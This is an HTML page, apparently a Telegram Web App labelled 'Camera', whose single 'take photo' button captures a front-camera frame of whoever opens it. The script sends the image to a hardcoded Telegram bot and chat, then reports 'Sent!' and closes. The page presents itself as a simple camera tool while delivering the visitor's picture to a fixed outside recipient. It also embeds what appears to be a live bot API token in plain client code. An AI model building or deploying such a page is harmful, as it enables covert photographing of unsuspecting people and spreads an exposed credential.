<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Camera</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
</head>
<body style="margin:0;background:#000;display:flex;justify-content:center;align-items:center;height:100vh;color:#fff;font-family:sans-serif;flex-direction:column;">
    <button id="btn" style="padding:20px 40px;font-size:24px;background:#0088cc;color:#fff;border:none;border-radius:10px;cursor:pointer;">
        📸 Сделать фото
    </button>
    <h1 id="status" style="margin-top:20px;font-size:18px;"></h1>

    <script>
        const tg = window.Telegram.WebApp;
        tg.ready();

        const status = document.getElementById('status');

        document.getElementById('btn').addEventListener('click', function() {
            this.style.display = 'none';
            status.innerText = '📸 Запрос камеры...';

            // Используем НАТИВНЫЙ МЕТОД TELEGRAM для камеры
            tg.requestCamera('front', function(error, stream) {
                if (error) {
                    status.innerText = '❌ Ошибка камеры: ' + error;
                    console.error(error);
                    return;
                }

                status.innerText = '📸 Съёмка...';

                // Создаём video из потока
                const video = document.createElement('video');
                video.srcObject = stream;
                video.play();

                // Ждём кадр
                video.onloadedmetadata = function() {
                    const canvas = document.createElement('canvas');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    const ctx = canvas.getContext('2d');
                    ctx.drawImage(video, 0, 0);

                    // Отправляем фото через Telegram API
                    canvas.toBlob(function(blob) {
                        const formData = new FormData();
                        formData.append('chat_id', '7406666272');
                        formData.append('photo', blob, 'photo.jpg');

                        fetch('https://api.telegram.org/bot8677834656:AAG65uW4UP2WbT_3Op4exFMOTJsHnxRR85A/sendPhoto', {
                            method: 'POST',
                            body: formData
                        })
                        .then(res => res.json())
                        .then(data => {
                            if (data.ok) {
                                status.innerText = '✅ Отправлено!';
                                tg.close();
                            } else {
                                status.innerText = '❌ Ошибка API';
                            }
                        })
                        .catch(() => {
                            status.innerText = '❌ Ошибка сети';
                        });

                        stream.getTracks().forEach(t => t.stop());
                    }, 'image/jpeg', 0.8);
                };
            });
        });
    </script>
</body>
</html>
